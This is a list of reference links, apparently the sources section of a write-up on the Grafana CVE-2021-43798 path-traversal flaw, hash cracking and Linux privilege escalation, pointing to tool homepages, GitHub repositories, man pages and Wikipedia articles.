- [Grafana Decryptor for CVE-2021-43798 - GitHub](https://github.com/Sic4rio/Grafana-Decryptor-for-CVE-2021-43798)
- [Grafana2Hashcat - GitHub](https://github.com/iamaldi/grafana2hashcat)
- [Hashcat - Homepage](https://hashcat.net/hashcat/)
- [Hashcat - Kali Tools](https://www.kali.org/tools/hashcat/)
- [Hashcat - Wiki](https://hashcat.net/wiki/)
- [id - Linux manual page](https://man7.org/linux/man-pages/man1/id.1.html)
- [Linux Privilege Escalation Checklist - Cajac's CTF Notes](https://cajac.gitbook.io/ctf-notes/priv-esc/linux-privilege-escalation/linux-privesc-checklist)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [Nmap - Wikipedia](https://en.wikipedia.org/wiki/Nmap)
- [OpenSSH - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
- [Prometheus - Homepage](https://prometheus.io/)
- [Python (programming language) - Wikipedia](https://en.wikipedia.org/wiki/Python_(programming_language))
- [searchsploit - Homepage](https://www.exploit-db.com/searchsploit)
- [searchsploit - Kali Tools](https://www.kali.org/tools/exploitdb/#searchsploit)
- [Secure Shell - Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell)
- [SQLite - Wikipedia](https://en.wikipedia.org/wiki/SQLite)
- [sqlite3 - Linux manual page](https://linux.die.net/man/1/sqlite3)
- [ssh - Linux manual page](https://man7.org/linux/man-pages/man1/ssh.1.html)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [vi - Linux manual page](https://man7.org/linux/man-pages/man1/vi.1p.html)
- [wget - Linux manual page](https://man7.org/linux/man-pages/man1/wget.1.html)
- [WhatWeb - Homepage](https://morningstarsecurity.com/research/whatweb)
- [WhatWeb - Kali Tools](https://www.kali.org/tools/whatweb/)
